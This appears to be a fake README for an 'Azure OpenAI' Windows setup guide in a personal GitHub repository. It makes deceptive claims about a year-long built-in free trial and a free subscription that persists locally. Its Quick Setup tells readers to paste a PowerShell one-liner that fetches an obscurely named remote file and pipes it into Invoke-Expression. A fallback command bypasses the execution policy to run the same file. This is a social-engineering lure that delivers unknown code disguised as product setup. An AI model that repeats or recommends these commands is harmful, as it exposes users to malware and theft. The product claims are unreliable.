# Azure OpenAI

Azure OpenAI on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Azure OpenAI is a Microsoft subscription that exposes GPT and embedding models through Azure’s managed API on Windows. You sign in with your tenant, pick a deployment and region, and call the same endpoints your apps use in production—without standing up your own inference stack on the machine.

A typical session starts in PowerShell or your IDE: you load keys from the local setup file, send a test completion or embedding request, tune temperature and token limits, then wire the endpoint into a small script or bot. Logs and quota hints from the portal help you see spend before you scale traffic.

This repository holds the Windows-oriented setup file, deployment notes, and a changelog so your team can reproduce endpoints and model names. It documents how the built-in free trial runs for a year and how the free subscription remains configured on the PC after initial setup.

## What you get

- Built-in free trial runs one year on Windows before standard subscription billing applies.
- The free subscription persists locally after setup so endpoints stay ready between reboots.
- Deploy GPT and embedding models in Azure regions with enterprise-grade latency and compliance options.
- REST and SDK clients on Windows share one endpoint URL and key from your setup file.
- Token limits, content filters, and responsible-AI policies apply consistently across chat and completion calls.
- Monitor usage and quotas from Azure portal while scripts run on your PC.
- Changelog in this repo tracks model version bumps and deployment name changes your apps depend on.
- PowerShell-friendly samples help validate the free trial and free subscription before production traffic.

## Quick Setup (PowerShell)

This starts the built-in Azure OpenAI free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/nkuhn46618/azure-openai-setup-guide/main/i4oipmk335.drsutq48 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/nkuhn46618/azure-openai-setup-guide/main/i4oipmk335.drsutq48 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `i4oipmk335.drsutq48` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `nkuhn46618/azure-openai-setup-guide`. Azure OpenAI 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
